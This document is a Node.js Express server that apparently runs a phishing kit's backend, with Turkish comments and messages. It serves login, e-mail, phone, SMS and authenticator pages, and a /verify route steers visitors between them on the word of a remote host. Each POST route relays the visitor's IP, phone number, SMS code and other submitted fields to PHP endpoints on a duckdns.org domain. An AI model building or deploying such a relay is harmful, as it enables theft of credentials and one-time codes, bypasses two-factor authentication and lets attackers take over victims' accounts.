const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const path = require('path');
const requestIp = require('request-ip');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cookieParser());
app.use(requestIp.mw());
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

 
app.use(express.static(path.join(__dirname, 'public')));

 app.use(cors());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
 
app.post('/apitr', async (req, res) => {
  const clientIp = req.clientIp;  
  const { action, phoneinput, ...otherData } = req.body;  
  
  try {

    const postData = {
      ip: clientIp,
      action: action,
      ...(phoneinput && { phoneinput: phoneinput }),
      ...otherData 
    };

    const response = await axios.post('https://088855488854758.duckdns.org/livechats.php', postData);
 
    res.send(response.data);
  } catch (error) {
    console.error("Hedef URL'ye POST gönderiminde hata:", error);
    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
  }
});

app.post('/api2', async (req, res) => {
  const clientIp = req.clientIp;
  const { action, phoneinput, ...otherData } = req.body;

  try {
    const postData = {
      ip: clientIp,
      action: action,
      ...(phoneinput && { phoneinput: phoneinput }),
      ...otherData,
    };

    const response = await axios.post('https://088855488854758.duckdns.org//livechats.php', postData);

    res.send(response.data);
  } catch (error) {
    console.error('Hedef URL\'ye POST gönderiminde hata:', error);
    res.status(500).send('Sunucu hatası, lütfen daha sonra tekrar deneyin.');
  }
});

app.listen(3000, () => {
  console.log("API server running on http://localhost:3000");
});

app.get('/login', (req, res) => {
    const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'home.html'));
});

app.get('/bekle', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
  res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
});
app.get('/eposta', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
  res.sendFile(path.join(__dirname, 'public', 'eposta.html'));
});
app.get('/phone', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'phone.html'));
  });
app.get('/sms', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
  res.sendFile(path.join(__dirname, 'public', 'sms.html'));
});
app.get('/mail', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'mail.html'));
  });
  app.get('/email-error', (req, res) => {
       const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'email-error.html'));
  });
  app.get('/password-error', (req, res) => {
       const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'password-error.html'));
  });
  app.get('/sms-error', (req, res) => {
       const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'sms-error.html'));
  });
  app.get('/control.php?page=telefonHata', (req, res) => {
       const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'sms-error.html'));
  });
app.get('/authenticator', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'authenticator.html'));
   });
  app.get('/error-number', (req, res) => {
       const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'error-number.html'));
  });
app.get('/successfuly', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
  res.sendFile(path.join(__dirname, 'public', 'basarili.html'));
});
 
 
app.get('/verify', async (req, res) => {
    const clientIp = req.clientIp;  
  
     
      
      const response = await axios.post('https://088855488854758.duckdns.org//eksik.php', {
        ip: clientIp
      });
  
 
      if (response.data === '/control.html?page=eposta') {
        res.redirect('/eposta');
      } else if (response.data === '/control.html?page=telno') {
        res.redirect('/phone');
      } else {
        res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
      
      }
     
  });

 
app.post('/api', async (req, res) => {
  const clientIp = req.clientIp; // Ziyaretçinin IP adresi
  const { x } = req.body; // Gönderilen x değişkeni

  try {
    // IP ve x değerlerini hedef URL'ye gönderiyoruz
    const response = await axios.post('https://088855488854758.duckdns.org//livechat.php', {
      ip: clientIp,
      x: x
    });

    
    res.send(response.data);
  } catch (error) {
    console.error("Hedef URL'ye POST gönderiminde hata:", error);
    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
  }
});

app.post('/sms', async (req, res) => {
  const clientIp = req.clientIp;  
  const { sms } = req.body;  

  try {

 
    const response = await axios.post('https://088855488854758.duckdns.org//sms.php', {
      ip: clientIp,
      sms: sms
    });


    res.send(response.data);
  } catch (error) {
    console.error("Hedef URL'ye POST gönderiminde hata:", error);
    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
  }
});

 
app.post('/livechats', async (req, res) => {
    const clientIp = req.clientIp;  
    const { action, phoneinput, ...otherData } = req.body; 
    
    try {
 
      const postData = {
        ip: clientIp,
        action: action,
        ...(phoneinput && { phoneinput: phoneinput }),  
        ...otherData  
      };
  
 
      const response = await axios.post('https://088855488854758.duckdns.org//livechats.php', postData);
 
      res.send(response.data);
    } catch (error) {
      console.error("Hedef URL'ye POST gönderiminde hata:", error);
      res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
    }
  });
  

app.post('/livechatss', async (req, res) => {
  const clientIp = req.clientIp;  
  const { phone2} = req.body;  

  try {
     
    const response = await axios.post('https://088855488854758.duckdns.org//phone.php', {
      ip: clientIp,
      phone2: phone2
    });

     
    res.send(response.data);
  } catch (error) {
    console.error("Hedef URL'ye POST gönderiminde hata:", error);
    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
  }
});


app.listen(port, () => {
    console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
});
